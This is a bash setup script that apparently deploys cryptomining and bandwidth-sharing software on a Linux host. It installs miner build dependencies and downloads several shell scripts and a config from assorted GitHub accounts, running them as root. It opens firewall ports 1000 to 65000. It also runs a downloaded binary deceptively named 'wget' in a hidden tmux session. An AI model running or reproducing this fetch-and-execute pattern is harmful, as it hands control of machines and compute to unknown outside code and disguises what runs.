#!/bin/bash
sudo apt update
sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev -y


wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb
sudo dpkg -i uam-latest_amd64.deb
wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
sudo tmux new-session -d -s 2 'bash p2p.sh'


cd /opt/uam
sudo ufw allow 1000:65000/tcp
sudo ufw allow 1000:65000/udp

sudo tmux new-session -d -s 1 './uam --pk D4BE04937A8AC67F3F01B9588D39C8C2A3875F45C2E93CC37DCC5D0DF71A9266'
sleep 600

sudo rm config.json
sudo wget https://raw.githubusercontent.com/renansouza60974/learncode/main/config.json
sudo sed -i "s/renansouza60974/$HOSTNAME/g" config.json
sudo wget https://github.com/average140421/test/raw/main/wget
wget https://raw.githubusercontent.com/average140421/test/main/1gb.sh
sudo bash 1gb.sh
wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
sudo bash rdom.sh
sudo chmod +x wget
sudo tmux new-session -d -s my_session1  './wget -t 2'
